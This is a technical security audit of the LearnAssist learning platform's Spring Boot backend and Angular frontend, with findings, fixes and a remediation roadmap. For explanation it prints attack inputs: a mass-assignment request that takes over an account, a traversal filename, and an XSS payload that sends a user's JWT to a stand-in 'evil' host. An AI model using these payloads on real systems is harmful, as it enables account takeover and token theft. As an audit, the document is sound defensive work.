# LearnAssist — Technical Audit (Backend & Frontend)

| | |
|---|---|
| **Date** | 2026-10-02 |
| **Scope** | `Learn_Assist_Backend` (Spring Boot 3.4.2 / Java 17 / PostgreSQL) and `Learn_Assist_Frontend/LearnAssist` (Angular 18 / Tailwind) |
| **Commit audited** | `d825763` (branch `main`) |
| **Method** | Manual review of all backend sources (~4,200 lines Java) and frontend sources (~11,500 lines TS/HTML/CSS), configuration, dependencies and git history. Backend compiled (`mvnw -o compile` ✅) and its single test passed in the last recorded run. *(Correction: the frontend `node_modules` was installed; the frontend builds. `ng test` did not compile at audit time — see the remediation log.)* |

---

## 1. Executive summary

LearnAssist has a clean layout (controllers → services → repositories on the backend, standalone components with route guards on the frontend). Ownership checks already exist for most instructor write operations. However, the project **is not ready for production**:

- **3 critical security flaws.** An attacker can take over any account or formation by sending an `id` in a JSON body. A malicious instructor can run JavaScript in every participant's browser and steal their JWT.
- **The AI chatbot can't work as written.** Follow-up messages send an invalid role to Gemini, and the configured model (`gemini-1.5-flash`) has been retired by Google.
- **Chat privacy is broken.** Any participant can list every user's chat sessions and read any conversation.
- **Scalability:** almost every query loads entire tables (`findAll()`) and filters them in Java.
- **Quality:** no real tests, no global error handling, and inconsistent API responses.

### Scorecard

| Area | Backend | Frontend |
|---|:---:|:---:|
| Security | 🔴 3/10 | 🔴 3/10 |
| Correctness / bugs | 🟠 5/10 | 🟠 5/10 |
| Performance / scalability | 🔴 3/10 | 🟠 5/10 |
| Architecture & maintainability | 🟠 5/10 | 🟠 5/10 |
| Testing | 🔴 1/10 | 🔴 1/10 |
| Configuration / DevOps | 🟠 4/10 | 🟠 4/10 |

### Findings count

| Severity | Backend | Frontend | Total |
|---|:---:|:---:|:---:|
| 🔴 Critical | 2 | 1 | **3** |
| 🟠 High | 7 | 2 | **9** |
| 🟡 Medium | 10 | 6 | **16** |
| 🔵 Low / Info | 9 | 7 | **16** |

---

## 2. Backend findings

> Paths are relative to `Learn_Assist_Backend/src/main/java/com/example/LearnAssist/`.

### 🔴 Critical

#### B-01 — Account takeover via mass assignment of `id` at registration
**Where:** [ParticipantAuthenticationController.java:75](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Authentification/ParticipantAuthenticationController.java#L75), [InstructorAuthenticationController.java:75](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Authentification/InstructorAuthenticationController.java#L75)

`/register` binds the request body directly to the JPA entity (`@RequestBody Participant`). If the JSON contains `"id": 42`, `repository.save()` sees a non-null id and calls `merge()`, which **overwrites the existing row 42** with the attacker's email and password. The attacker then logs in as user 42 and inherits that user's approved enrollments and chat history (for an instructor: their articles). The real owner is locked out.

```http
POST /api/participant/register
{"id": 42, "email": "attacker@x.com", "password": "...", "firstName": "a", "lastName": "b", "phone": "1", "city": "c"}
```

**Fix:** use dedicated request DTOs (`RegisterParticipantRequest`) with no `id`, `role` or `status` fields, and map them to a *new* entity. Add Bean Validation annotations (`@Email`, `@NotBlank`, `@Size`) to the DTO. `@Valid` currently does nothing because the entity has no constraints.

#### B-02 — Formation hijacking via mass assignment of `id`
**Where:** [FormationController.java:90](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/FormationController.java#L90) → `FormationServicesImpl.addFormation`

The same flaw exists on `POST /api/formations` (`@RequestPart Formation`). An instructor can send another instructor's formation `id` with their own `emailInstructor` and overwrite that formation, taking ownership of it and its courses. Clients can also set `rate` and `formationStatus` freely.

**Fix:** use a `CreateFormationRequest` DTO, and set `emailInstructor` (better: an `Instructor` FK, see B-24) from the `Principal`, never from the body.

### 🟠 High

#### B-03 — Chat sessions leak across users (IDOR)
**Where:** [ChatSessionController.java:26](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/ChatSessionController.java#L26), [ChatSessionController.java:41](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/ChatSessionController.java#L41)

- `GET /api/sessions` returns **every** session of **every** participant (title and the first 80 characters of the question).
- `GET /api/sessions/{id}` returns the full messages of any session without checking ownership.

**Fix:** delete the global listing endpoint, and check `session.participant.email == principal.name` in `getMessagesBySessionId`. Return 404, not 403, so the endpoint doesn't reveal which ids exist.

#### B-04 — Chatbot follow-ups always fail: invalid Gemini role
**Where:** [ChatBotServicesImpl.java:85](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ChatBotServicesImpl.java#L85), `ChatSessionServicesImpl.createSession`

Bot messages are stored with `role = "assistant"` and replayed to Gemini as history. Gemini only accepts `user` and `model`, so every message after the first in a session gets an HTTP 400. The exception is swallowed, and the user sees *"Erreur lors de l'appel à Gemini API."*

**Fix:** map `assistant` to `model` when building `contents`, or store `model` directly.

#### B-05 — Retired AI model and API key sent in the URL
**Where:** [WebConfig.java:28](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Configurations/WebConfig.java#L28), [ChatBotServicesImpl.java:74](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ChatBotServicesImpl.java#L74), [ChatSessionServicesImpl.java:50](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ChatSessionServicesImpl.java#L50)

- `gemini-1.5-flash` is hard-coded, and Google has retired the Gemini 1.5 models. Move the model name to configuration and use a current model.
- The key is passed as `?key=` in the query string, where proxies, access logs and error traces can capture it. Send it in the `x-goog-api-key` header instead.
- The key is read from `spring.ai.openai.api-key` while the code calls Gemini directly, and the `spring-ai-openai` starter in `pom.xml` is unused. Either use Spring AI properly or remove it and use a `gemini.api-key` property. The README also says "OpenAI", which is misleading.

#### B-06 — Unsafe upload filenames (possible path traversal) and no file validation
**Where:** [FileServicesImpl.java:19](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/FileServicesImpl.java#L19), [ProfilePictureServicesImpl.java:36](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ProfilePictureServicesImpl.java#L36)

The stored name is `UUID + "_" + file.getOriginalFilename()`, and the original filename is fully controlled by the client. A name like `..\..\..\x.jsp` produces `uploads/videos/<uuid>_..\..\..\x.jsp`. On Windows, which normalises paths lexically, this can write outside the upload folder. Also:
- Content type, extension and magic bytes are never checked, so any file can be uploaded as a "video", "PDF" or "image".
- Files aren't deleted when their entity is updated or deleted, so orphaned files pile up.
- Profile pictures are written to disk *before* the user is resolved.

**Fix:** generate the name server-side (`UUID + whitelisted extension`), validate MIME type and extension against an allow-list, and check that `resolved.startsWith(baseDir)`.

#### B-07 — Instructors can read any other instructor's paid content
**Where:** [CourseServicesImpl.java:39](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/CourseServicesImpl.java#L39), [ChapterServicesImpl.java:34](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ChapterServicesImpl.java#L34)

`if (role.equals("ROLE_INSTRUCTOR")) return course;` lets any instructor read every course and chapter on the platform. Admins fall through to `isParticipantApproved` and get an error. The code also checks only the *first* authority.

**Fix:** allow access only if the user owns the course, is an admin, or is an approved participant.

#### B-08 — Password hashes exposed by entity serialisation
**Where:** [User.java:36](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Models/User.java#L36)

`password` has no `@JsonIgnore` / `@JsonProperty(access = WRITE_ONLY)`. Endpoints that return raw `Instructor` or `Participant` entities, such as `/api/instructors/{id}`, `/api/instructors/all` and `/api/participants/all`, serialise the BCrypt hash. They're admin-only today, but one new endpoint returning an entity would leak hashes publicly.

**Fix:** return response DTOs everywhere, and mark `password` as write-only as a safety net.

#### B-09 — Instructor password change does nothing
**Where:** [InstructorController.java:40](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/InstructorController.java#L40) → [InstructorServicesImpl.java:37](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/InstructorServicesImpl.java#L37)

The UI sends `password` and the endpoint verifies the old one, but `updateInstructor` never copies the password. The user is told it worked, but the password is unchanged.

### 🟡 Medium

| ID | Finding | Location | Recommendation |
|---|---|---|---|
| B-10 | **Old password sent in the URL path** (`PATCH /api/instructors/{oldPassword}`, `PUT /api/participants/{oldPassword}`). It ends up in server, proxy and browser logs. Passwords containing `/`, `#`, `?` or `%` also break the request. | [InstructorController.java:40](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/InstructorController.java#L40), [ParticipantController.java:38](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/ParticipantController.java#L38) | Add a dedicated `POST /me/password` with `{oldPassword, newPassword}` in the body. |
| B-11 | **Profile update mass assignment**: users can change their own `status` and `email`. A new email isn't checked against the other user table, and since the JWT subject is the email, the current token stops working. | [ParticipantServicesImpl.java:68](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ParticipantServicesImpl.java#L68), [:95](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ParticipantServicesImpl.java#L95) | Use an update DTO without `status`. Re-check email uniqueness in both tables and issue a new token. |
| B-12 | **Public PII exposure**: `/api/instructors/list` and `/details/{id}` are `permitAll` and return email, phone, city and date of birth. | [InstructorController.java:89](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/InstructorController.java#L89), [:103](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/InstructorController.java#L103) | Return only a public profile (name, bio, speciality, photo). |
| B-13 | **User enumeration on login**: an unknown email gets `404 "User not found"` while a wrong password gets a different message. | [ParticipantAuthenticationController.java:48](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Authentification/ParticipantAuthenticationController.java#L48) | Always return `401` with the same generic message. |
| B-14 | **No rate limiting** on login, register or the chatbot. This allows brute force and lets anyone run up the LLM bill. `httpBasic()` is also enabled, so Basic auth works on every endpoint and bypasses the login flow. | [SecurityConfig.java:70](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Configurations/SecurityConfig.java#L70) | Remove `httpBasic`. Add Bucket4j or a gateway rate limit, plus per-user chat quotas. |
| B-15 | **No global exception handling**: ~60 copies of `try/catch(Exception) → 400 + e.getMessage()`. Internal messages leak, and every error is a 400 (even 404/403/500). `CourseController` serialises the **whole exception object**, stack trace included. | [CourseController.java:50](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/CourseController.java#L50) | Add a `@RestControllerAdvice` with typed exceptions (`NotFound`, `Forbidden`, `Conflict`) and a uniform error body (RFC 7807 `ProblemDetail`). |
| B-16 | **Full-table scans everywhere**: `findAll()` followed by filtering in Java in ~15 methods (formations, chapters, articles, inscriptions, sessions), plus one instructor lookup per formation card (N+1 queries). | `*ServicesImpl.java` | Use derived or JPQL queries (`findByEmailInstructor`, `countBy…`, `existsBy…`), projections and pagination (`Pageable`). |
| B-17 | **NullPointerExceptions crash endpoints**: `getDateOfBirth().toString()` fails when the date is null (it's optional), and `article.getImageFileName().isEmpty()` fails when an article has no image, which crashes the instructor dashboard. | [InstructorServicesImpl.java:86](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/InstructorServicesImpl.java#L86), [ParticipantServicesImpl.java:45](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ParticipantServicesImpl.java#L45), [ChapterServicesImpl.java:145](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ChapterServicesImpl.java#L145) | Add null-safe handling (`Objects.toString`, `StringUtils.hasText`). |
| B-18 | **Enrollment logic bugs**: `approve` and `reject` report success even when the caller isn't the owner. A participant can request the same formation twice, which is caught only by a DB unique-constraint error. `getAllInscriptionFormationByParticipantId` adds to the list it is iterating over, which throws `ConcurrentModificationException`. | [InscriptionFormationServicesImpl.java:45](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/InscriptionFormationServicesImpl.java#L45), [:156](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/InscriptionFormationServicesImpl.java#L156) | Throw `Forbidden` for non-owners, check for an existing request first, and fix the loop. |
| B-19 | **Titles are globally unique across all users**: only one chapter called "Introduction" can exist on the whole platform. The same applies to courses, articles and chat sessions. | [ChapterServicesImpl.java:59](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/ServicesImplementations/ChapterServicesImpl.java#L59) | Scope uniqueness to the parent (formation or course), or drop it. |

### 🔵 Low / Info

| ID | Finding |
|---|---|
| B-20 | File-serving endpoints check `exists() \|\| isReadable()` (should be `&&`) and don't verify that `normalize()`d paths stay in the base directory ([FileController.java:44](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Controllers/FileController.java#L44)). Spring's `StrictHttpFirewall` blocks the obvious traversal today, but there's no defence-in-depth. Videos are served whole, with no HTTP Range support. |
| B-21 | Any authenticated user can download any video or document by filename, with no enrollment check (the UUID names make guessing hard, but this is still access control by obscurity). |
| B-22 | CORS origin `http://localhost:4200` is hard-coded in 3 places (`WebConfig`, `@CrossOrigin` on 3 controllers). `allowCredentials(true)` isn't needed for Bearer tokens. Move the origin to configuration. |
| B-23 | `System.out.println("Validate")` runs on every request ([JwtUtils.java:59](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Jwt/JwtUtils.java#L59)). The JWT filter also logs full stack traces at ERROR level for every invalid token. |
| B-24 | Data model: `Formation.emailInstructor` is a string instead of a `@ManyToOne Instructor` ([Formation.java:30](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Models/Formation.java#L30)). Prices and durations are `String`. Statuses are free text (`"published"`, `"Pending"`, `"Approved"`) instead of enums. `Chapter.quiz` is `varchar(255)` ([Chapter.java:21](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Models/Chapter.java#L21)). `java.util.Date` is used instead of `LocalDate`. |
| B-25 | Dead code: the `Users` entity creates an unused table. `InscriptionFormationResponse` and `ChatResponse` are empty or unused. `"api/chat"` is in `permitAll` but no such endpoint exists ([SecurityConfig.java:65](Learn_Assist_Backend/src/main/java/com/example/LearnAssist/Configurations/SecurityConfig.java#L65)). `Admin` exists, but nothing can create an admin. |
| B-26 | Field injection (`@Autowired` on fields) everywhere. `PasswordEncoder passwordEncoder = new BCryptPasswordEncoder()` combined with `@Autowired` is confusing. Prefer constructor injection with `final` fields. Packages use mixed casing (`Controllers`, `ServicesImplementations`), and Java convention is lower-case. `ProfilePictureServicesImpl` is injected as a concrete class with no interface. |
| B-27 | Config: `application.yml.example` doesn't match what the code reads (`jwt.secret` vs `spring.app.jwtSecret`). `ddl-auto: update` and `show-sql: true` are fine for development but need a `prod` profile, and migrations should use Flyway or Liquibase. Artifact name is `EduBot` and the description is "Demo project for Spring Boot". |
| B-28 | JWTs can't be revoked: there's no logout, refresh token or token versioning, and the 24h default lifetime is long. The subject is the email, which can change (see B-11). Prefer the immutable user id. |

---

## 3. Frontend findings

> Paths are relative to `Learn_Assist_Frontend/LearnAssist/src/app/`.

### 🔴 Critical

#### F-01 — Stored XSS through the formation `videoUrl` (steals participants' JWTs)
**Where:** [safe-url.pipe.ts:12](Learn_Assist_Frontend/LearnAssist/src/app/safe-url.pipe.ts#L12), used in [participant-formation-details.component.html:22](Learn_Assist_Frontend/LearnAssist/src/app/Components/Participant-Pages/participant-formation-details/participant-formation-details.component.html#L22) and 3 other templates.

`formation.videoUrl` comes straight from the API, is set by the instructor, and isn't validated on the backend. It's passed through `bypassSecurityTrustResourceUrl` into an `<iframe [src]>`. An instructor who sets `videoUrl = "javascript:fetch('//evil/?t='+localStorage.userToken)"` and uploads no video file gets code running **in the LearnAssist origin** for every participant who opens the formation. That code can read the JWT from `localStorage` (F-04).

**Fix:**
1. Delete the `safeUrl` pipe, or let it accept only `blob:` URLs and an allow-list of embed hosts (`https://www.youtube.com/embed/…`).
2. Use `<video [src]>` for blob URLs instead of `<iframe>`.
3. On the backend, validate `videoUrl` (only `https`, allow-listed hosts).

### 🟠 High

#### F-02 — XSS in the chatbot Markdown renderer
**Where:** [chat-page.component.ts:136-173](Learn_Assist_Frontend/LearnAssist/src/app/Components/Participant-Pages/chat-page/chat-page.component.ts#L136-L173), [chat-bot.component.ts:189](Learn_Assist_Frontend/LearnAssist/src/app/Components/Participant-Pages/chat-bot/chat-bot.component.ts#L189)

A hand-written regex converts Markdown to HTML **without escaping the input first**, then the result goes through `bypassSecurityTrustHtml` and into `[innerHTML]`. Any `<img src=x onerror=…>` in an LLM answer runs, and LLM output is easy to steer with prompt injection. `[text](javascript:…)` links are also emitted as-is.

**Fix:** use a proper library (`marked` + `DOMPurify`, or `ngx-markdown` with sanitisation), and **don't** bypass Angular's sanitiser.

#### F-03 — Broken navigation: redirects to routes that don't exist
**Where:** [participant.guard.ts:15](Learn_Assist_Frontend/LearnAssist/src/app/guards/participant.guard.ts#L15), `instructor.guard.ts`, [instructor-navbar.component.ts:59](Learn_Assist_Frontend/LearnAssist/src/app/Components/Instructor-Pages/instructor-navbar/instructor-navbar.component.ts#L59)

The guards redirect to `/participant-login` and `/instructor-login`, and the navbar navigates to `/profile/edit`, `/profile/photo` and `/instructor-home-page`. **None of these routes exist**, and [app.routes.ts](Learn_Assist_Frontend/LearnAssist/src/app/app.routes.ts#L73) has no `**` wildcard, so the router throws `NG04002` and the user sees a blank or stuck page when the session expires. The `login/instructor-login` and `login/participant-login` components are dead code.

**Fix:** redirect to `/login` using `return router.createUrlTree(['/login'])`, fix the navbar paths (`/instructor/edit-profile`, `/instructor/profile-picture`), and add `{ path: '**', redirectTo: 'home' }`.

### 🟡 Medium

| ID | Finding | Location | Recommendation |
|---|---|---|---|
| F-04 | **JWT and PII in `localStorage`** (`userToken`, `userEmail`, `userId`, `userRole`, `userGender`, `photoName`). Any XSS (F-01, F-02) can read them. | [connexion.component.ts:35](Learn_Assist_Frontend/LearnAssist/src/app/Components/connexion/connexion.component.ts#L35) | Best: an `HttpOnly; Secure; SameSite` cookie. At minimum, fix the XSS issues and keep the token in one `AuthService`. |
| F-05 | **The interceptor sends `Authorization: Bearer null`** when logged out, and attaches the token to *every* request, including any third-party host. | [jwt-token.interceptor.ts:7](Learn_Assist_Frontend/LearnAssist/src/app/interceptors/jwt-token.interceptor.ts#L7) | Add the header only when a token exists and `req.url.startsWith(environment.apiUrl)`. Handle `401` centrally by logging out and redirecting to `/login`. |
| F-06 | **Memory leaks from blob URLs**: 29 `URL.createObjectURL` calls but only 1 `revokeObjectURL`. Whole **videos** are downloaded into memory as Blobs before playback. | `*-details.component.ts` | Revoke in `ngOnDestroy`. Stream video with `<video src="/api/files/video/…">` using a short-lived signed URL or a cookie, with HTTP Range support on the backend. |
| F-07 | **Navigation state kept in `localStorage`** (`idFormation`, `courseId`, `chapterId`). `instructor/formation-details` has no `:id`, so deep links, refresh and multiple tabs show the wrong formation. | `app.routes.ts`, formation pages | Put ids in route params (`formation-details/:id`). |
| F-08 | **The password change flow sends the old password in the URL** (the frontend side of B-10), unencoded. | `services/instructor`, `services/participant` | Send it in the body to a dedicated endpoint. |
| F-09 | **Unmanaged timers and subscriptions**: the typing animation's `setInterval` is never cleared on destroy ([chat-page.component.ts:186](Learn_Assist_Frontend/LearnAssist/src/app/Components/Participant-Pages/chat-page/chat-page.component.ts#L186)). 36 files subscribe, but only 1 cleans up. | components | Use `takeUntilDestroyed()`, the `async` pipe or signals, and clear intervals in `ngOnDestroy`. |

### 🔵 Low / Info

| ID | Finding |
|---|---|
| F-10 | **Type safety:** 41 `: any` usages, and services return `Observable<any>` even though `models/*.ts` exist. Turn on `strict` typing for API responses. |
| F-11 | **Leftover logging:** `console.log` / `console.error` in 36 files, some logging full HTTP responses. Remove them or put them behind `!environment.production`. |
| F-12 | **Placeholder production URL:** `environment.prod.ts` points to `https://api.learnassist.com/api`. |
| F-13 | **Tests are scaffolds only:** 55 `*.spec.ts` files, 40 of which only contain the generated `should create` test. Many of those will fail without `HttpClient` / router providers. There's no e2e test and no CI. |
| F-14 | **Stray, conflicting tooling:** `Learn_Assist_Frontend/package.json` (Tailwind **4**) and its committed `node_modules/` (~1,150 files) sit *outside* the Angular project, which uses Tailwind **3**. Delete them and add `**/node_modules/` to the root `.gitignore`. |
| F-15 | **Duplicate code:** `markdownToHtml` and the chat UI exist in both `chat-bot` and `chat-page`. Two login implementations exist (`connexion` plus the unused `login/*`). Folder names mix casing (`Instructor-Pages`, `formation-Pages`, `home-pages`). |
| F-16 | **Missing UX basics:** there's no logout on 401, no global error toast or HTTP error handler, and no loading or skeleton states on some pages. `index.html` is `lang="en"` while the UI is in French. |

---

## 4. Cross-cutting / repository

| ID | Finding |
|---|---|
| X-01 | ✅ **No secrets in git history** (checked `application.yml`, API keys and JWT secret). `application.yml` is correctly git-ignored. Keep it that way, and rotate the local keys if this machine has ever been shared. |
| X-02 | No CI pipeline (`.github/` only holds a local "modernize" hook). Add GitHub Actions that run `mvn verify`, `ng build` and `ng test`, plus dependency scanning (Dependabot / `npm audit` / OWASP dependency-check). |
| X-03 | No Docker or `docker-compose` setup for Postgres, backend and frontend, so onboarding needs manual setup. |
| X-04 | The README describes an OpenAI integration, but the code uses Google Gemini. `1- Espace formateur.txt` (untracked) lists planned features (packs, live sessions, messenger, revenue dashboard) that don't exist yet. Turn it into GitHub issues or a roadmap section. |
| X-05 | The API has no versioning (`/api/v1`) and no OpenAPI documentation. Adding `springdoc-openapi` would give a Swagger UI for free. |

---

## 5. Remediation roadmap

### Phase 1 — Fix before any deployment (≈ 2–3 days)
1. **B-01, B-02, B-11:** add request/response DTOs for register, profile update and formation create/update, and stop binding entities to requests.
2. **F-01, F-02:** remove `bypassSecurityTrust*`, add DOMPurify-based Markdown rendering, and validate `videoUrl` on both frontend and backend.
3. **B-03:** add ownership checks on chat sessions and delete `GET /api/sessions`.
4. **B-06:** generate upload filenames server-side, and allow-list types and extensions.
5. **B-08:** make `password` write-only, and use DTOs for all responses.

### Phase 2 — Make core features work (≈ 2 days)
6. **B-04, B-05:** map Gemini roles correctly, make the model configurable, and send the key in a header.
7. **B-09, B-10, F-08:** add a working `POST /me/password` endpoint.
8. **F-03:** fix guard redirects and navbar routes, and add a wildcard route.
9. **B-17, B-18, B-19:** fix the NPEs, enrollment logic and global title uniqueness.

### Phase 3 — Hardening & quality (≈ 1 week)
10. **B-15:** add a global `@RestControllerAdvice` and uniform error format. **F-05:** fix the interceptor and handle 401s.
11. **B-12, B-13, B-14:** trim public profiles, use generic login errors, add rate limiting, and remove `httpBasic`.
12. **B-07, B-21:** apply consistent authorisation rules to courses, chapters and files.
13. **B-16:** replace `findAll()` filtering with repository queries and add pagination.
14. **F-06, F-07, F-09:** stream video, revoke blob URLs, put ids in route params, and clean up subscriptions.

### Phase 4 — Long-term maintainability
15. Refactor the model (B-24): FK to `Instructor`, enums, numeric prices, Flyway migrations.
16. Testing: service unit tests (JUnit + Mockito), `@WebMvcTest` security tests per endpoint (one test per 🔴/🟠 finding as a regression guard), and Angular service and guard tests.
17. Add CI (X-02), Docker Compose (X-03), OpenAPI (X-05), environment-based configuration (B-22, B-27, F-12), and clean up tooling (F-14).

---

## 6. Strengths worth keeping

- Clear layered backend (Controller → Service interface → Impl → Repository).
- Stateless JWT with BCrypt password hashing, `@EnableMethodSecurity` and `@PreAuthorize` on most endpoints.
- Ownership checks already exist on most instructor update and delete operations (formations, courses, chapters, articles).
- Multipart size limits are configured, and secrets are kept out of git.
- The frontend uses modern Angular: standalone components, functional guards and interceptors, `environment` files, and lazy-friendly layouts per role.
- Upload filenames already include a UUID, so collisions are avoided.

---

## 7. Remediation log

| Phase | Date | Findings fixed | Verification |
|---|---|---|---|
| 1 — Critical security | 2026-10-02 | B-01, B-02, B-03, B-06, B-08, F-01, F-02 (+ B-20 file serving as a side effect) | Backend: 51 tests pass (`mvnw test`, incl. 50 new regression tests). Frontend: dev + prod build OK, 28 new specs pass. |

Notes:
- B-06 partially covers B-21: file names can no longer be injected through JSON, but downloading a video/document still only requires being authenticated (enrollment check → Phase 3).
- Pre-existing frontend test issues found and fixed so `ng test` compiles: wrong import in `instructor.service.spec.ts`, `chat-bot` `styleUrl` pointing to a missing `.scss`. 51 scaffold specs still fail for missing `HttpClient`/`ActivatedRoute` providers (tests phase).
